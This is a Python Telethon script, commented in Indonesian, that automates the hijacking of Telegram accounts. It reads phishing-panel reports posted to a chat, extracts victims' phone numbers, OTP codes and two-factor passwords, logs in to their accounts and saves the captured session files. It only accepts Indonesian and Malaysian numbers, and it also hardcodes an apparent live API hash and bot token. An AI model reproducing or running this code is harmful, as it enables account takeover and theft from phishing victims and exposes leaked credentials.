import asyncio
import os
import re
import json
import shutil
from telethon import TelegramClient, events

# === Konfigurasi Dasar ===
API_ID = 28085374
API_HASH = 'b2b03513008c2535e0859c7c4e1c1c36'
BOT_TOKEN = '7895384862:AAHVFKkUVUrKKXlByW70odqIrsjbxISCYuU'

TEMP_SESSIONS = "ewww_sessions"
FINAL_SESSIONS = "sessions"

os.makedirs(TEMP_SESSIONS, exist_ok=True)
os.makedirs(FINAL_SESSIONS, exist_ok=True)

# Prefix negara yang diizinkan
WHITELIST_PREFIX = ["+62", "+60"]

# Penyimpanan login sementara
login_queue = {}

# === Validasi Nomor ===
def valid_number(number):
    return (
        re.fullmatch(r"\+\d{10,15}", number)
        and any(number.startswith(pfx) for pfx in WHITELIST_PREFIX)
    )

# === Pindahkan session sukses ke folder final ===
def relocate_session(phone):
    src = os.path.join(TEMP_SESSIONS, phone)
    dst = os.path.join(FINAL_SESSIONS, f"{phone}.session")
    if os.path.exists(src):
        shutil.move(src, dst)
        print(f"[✔] Session {phone} berhasil dipindahkan ke folder sessions.")
    else:
        print(f"[✖] Session {phone} tidak ditemukan di {src}.")

# === Client utama ===
main_client = TelegramClient('main2', API_ID, API_HASH)

# === Proses pesan dari grup ===
@main_client.on(events.NewMessage)
async def handle_group_message(event):
    content = event.raw_text

    if any(tag in content for tag in [
        '❮ LAPORAN DAFTAR GRATISKU ❯',
        '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN LAMBE PECINTA JANDA ❯',
        '❮ LAPORAN FAIDIL  ❯'
    ]):
        phone = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', content)
        otp = re.search(r'OTP\s*:\s*(\d{5,6})', content)
        passwd = re.search(r'PASSWORD\s*:\s*(\S+)', content)

        if phone:
            number = phone.group(1)
            password = passwd.group(1) if passwd else None

            if not valid_number(number):
                print(f"[❗] Nomor tidak valid: {number}")
                return

            if otp:
                code = otp.group(1)
                print(f"[📨] OTP untuk {number}: {code}")
                if number in login_queue:
                    asyncio.create_task(login_with_code(number, code, password))
                else:
                    print(f"[⚠] Tidak ada OTP request sebelumnya untuk {number}")
            else:
                if number not in login_queue:
                    print(f"[📲] Meminta OTP untuk {number}")
                    asyncio.create_task(send_otp_request(number))
                else:
                    print(f"[⏳] Menunggu OTP untuk {number}...")

# === Kirim OTP ===
async def send_otp_request(number):
    try:
        sess_path = os.path.join(TEMP_SESSIONS, number)
        client = TelegramClient(sess_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.send_code_request(number)
            login_queue[number] = (client, None)
            print(f"[📧] Kode OTP dikirim ke {number}")
        else:
            print(f"[✔] {number} sudah login sebelumnya.")
            await client.disconnect()
    except Exception as err:
        print(f"[❌] Gagal mengirim OTP ke {number}: {err}")

# === Login menggunakan OTP ===
async def login_with_code(number, code, password=None):
    try:
        if number not in login_queue:
            print(f"[✖] Tidak ditemukan client aktif untuk {number}")
            return

        client, _ = login_queue[number]

        try:
            await client.sign_in(number, code)
        except Exception as e:
            if '2FA' in str(e) or 'password' in str(e).lower():
                if password:
                    await client.sign_in(password=password)
                else:
                    print(f"[🔒] Password diperlukan untuk {number}, tapi tidak tersedia.")
                    return

        print(f"[✅] Login berhasil untuk {number}")
        relocate_session(number)
        await client.disconnect()
        del login_queue[number]
    except Exception as err:
        print(f"[❌] Login gagal untuk {number}: {err}")

# === Jalankan ===
async def run_main():
    await main_client.start()
    print("[🚀] Bot Telegram aktif dan siap menerima pesan.")
    await main_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(run_main())
